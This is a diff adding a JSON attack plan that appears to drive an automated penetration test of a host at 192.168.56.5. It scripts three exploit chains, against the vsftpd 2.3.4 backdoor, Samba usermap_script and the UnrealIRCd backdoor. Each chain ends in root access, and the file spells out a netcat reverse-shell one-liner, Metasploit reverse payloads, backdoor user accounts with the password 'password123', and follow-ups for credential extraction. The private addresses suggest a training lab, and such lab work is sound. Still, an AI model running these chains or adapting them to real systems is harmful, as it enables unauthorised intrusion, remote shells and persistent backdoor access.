@@ -1,0 +1,297 @@
+{
+    "target": "192.168.56.5",
+    "summary": [
+        "vsftpd 2.3.4 backdoor (CVE-2011-2523) on port 21 for root access",
+        "Samba usermap_script (CVE-2007-2447) on ports 139/445 for root access",
+        "UnrealIRCd backdoor (CVE-2010-2075) on port 6667 for root access"
+    ],
+    "attack_chains": [
+        {
+            "name": "Chain 1: vsftpd Backdoor via Python Direct Exploit to Root Persistence",
+            "use_persistent_session": false,
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Direct Python exploit of vsftpd 2.3.4 backdoor to gain root shell",
+                    "commands": [
+                        {
+                            "type": "regular",
+                            "command": "python3 -c 'import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(10); try: s.connect((\"192.168.56.5\", 21)); s.recv(1024); s.send(b\"USER anonymous\\n\"); s.recv(1024); s.send(b\"PASS anonymous\\n\"); s.recv(1024); s.send(b\"USER :)\\n\"); data = s.recv(1024); print(\"SUCCESS: vsftpd backdoor triggered\"); print(data.decode()); s.close(); except socket.timeout: print(\"FAILED: Connection timed out\"); except Exception as e: print(f\"FAILED: {e}\")'"
+                        }
+                    ],
+                    "verification": "Check for backdoor activation and root shell prompt in output"
+                },
+                {
+                    "stage": "privilege_escalation",
+                    "description": "Verify root privileges via spawned shell",
+                    "commands": [
+                        {
+                            "type": "regular",
+                            "command": "nc -lvnp 4444"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "python3 -c 'import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.settimeout(10); try: s.connect((\"192.168.56.5\", 21)); s.recv(1024); s.send(b\"USER anonymous\\n\"); s.recv(1024); s.send(b\"PASS anonymous\\n\"); s.recv(1024); s.send(b\"USER :)\\n\"); s.recv(1024); s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s2.connect((\"192.168.56.2\", 4444)); s.send(b\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.2 4444 >/tmp/f\\n\"); print(\"Shell sent\"); s.close(); except Exception as e: print(f\"FAILED: {e}\")'"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sleep 5; echo 'id'; echo 'whoami'"
+                        }
+                    ],
+                    "verification": "Check for uid=0(root) and 'root' in nc session output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Create backdoor user and verify SSH access",
+                    "commands": [
+                        {
+                            "type": "regular",
+                            "command": "echo 'useradd -m -s /bin/bash backdoor; echo backdoor:password123 | chpasswd; cat /etc/passwd | grep backdoor'"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=ssh-rsa,ssh-dss backdoor@192.168.56.5 'whoami'"
+                        }
+                    ],
+                    "verification": "SSH command returns 'backdoor' and user creation confirmed"
+                }
+            ]
+        },
+        {
+            "name": "Chain 2: Samba Usermap Script Exploit to Root Persistence",
+            "use_persistent_session": true,
+            "session_name": "samba_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit Samba usermap_script vulnerability to gain root shell",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "samba_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "use exploit/multi/samba/usermap_script",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set PAYLOAD cmd/unix/reverse",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set LHOST 192.168.56.2",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "set LPORT 4445",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened' in output"
+                },
+                {
+                    "stage": "privilege_escalation",
+                    "description": "Verify root privileges",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c 'id'",
+                            "wait": 3
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c 'whoami'",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for uid=0(root) in output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Create backdoor user for SSH access",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash backdoor2'",
+                            "wait": 3
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c \"echo 'backdoor2:password123' | chpasswd\"",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "samba_session",
+                            "command": "sessions -i 1 -c 'cat /etc/passwd | grep backdoor2'",
+                            "wait": 2
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "samba_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=ssh-rsa,ssh-dss backdoor2@192.168.56.5 'whoami'"
+                        }
+                    ],
+                    "verification": "SSH login succeeds and returns 'backdoor2'"
+                }
+            ]
+        },
+        {
+            "name": "Chain 3: UnrealIRCd Backdoor Exploit to Root Persistence",
+            "use_persistent_session": true,
+            "session_name": "unreal_session",
+            "stages": [
+                {
+                    "stage": "initial_access",
+                    "description": "Exploit UnrealIRCd backdoor to gain root shell",
+                    "commands": [
+                        {
+                            "type": "start_session",
+                            "session_name": "unreal_session",
+                            "command": "msfconsole -q"
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "unreal_session",
+                            "command": "use exploit/unix/irc/unreal_ircd_3281_backdoor",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "unreal_session",
+                            "command": "set RHOSTS 192.168.56.5",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "unreal_session",
+                            "command": "set RPORT 6667",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "unreal_session",
+                            "command": "set PAYLOAD cmd/unix/reverse",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "unreal_session",
+                            "command": "set LHOST 192.168.56.2",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "unreal_session",
+                            "command": "set LPORT 4446",
+                            "wait": 1
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "unreal_session",
+                            "command": "exploit -j",
+                            "wait": 15
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "unreal_session",
+                            "command": "sessions -l",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for 'Command shell session X opened' in output"
+                },
+                {
+                    "stage": "privilege_escalation",
+                    "description": "Verify root privileges",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "unreal_session",
+                            "command": "sessions -i 1 -c 'id'",
+                            "wait": 3
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "unreal_session",
+                            "command": "sessions -i 1 -c 'whoami'",
+                            "wait": 2
+                        }
+                    ],
+                    "verification": "Check for uid=0(root) in output"
+                },
+                {
+                    "stage": "persistence",
+                    "description": "Create backdoor user for SSH access",
+                    "commands": [
+                        {
+                            "type": "session_command",
+                            "session_name": "unreal_session",
+                            "command": "sessions -i 1 -c 'useradd -m -s /bin/bash backdoor3'",
+                            "wait": 3
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "unreal_session",
+                            "command": "sessions -i 1 -c \"echo 'backdoor3:password123' | chpasswd\"",
+                            "wait": 2
+                        },
+                        {
+                            "type": "session_command",
+                            "session_name": "unreal_session",
+                            "command": "sessions -i 1 -c 'cat /etc/passwd | grep backdoor3'",
+                            "wait": 2
+                        },
+                        {
+                            "type": "close_session",
+                            "session_name": "unreal_session"
+                        },
+                        {
+                            "type": "regular",
+                            "command": "sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o PubkeyAcceptedKeyTypes=+ssh-rsa -o HostKeyAlgorithms=ssh-rsa,ssh-dss backdoor3@192.168.56.5 'whoami'"
+                        }
+                    ],
+                    "verification": "SSH login succeeds and returns 'backdoor3'"
+                }
+            ]
+        }
+    ],
+    "followup_requests": [
+        "Perform detailed enumeration on database services (MySQL, PostgreSQL) for credential extraction",
+        "Scan for additional vulnerabilities in web applications on ports 80 and 8180"
+    ]
+}
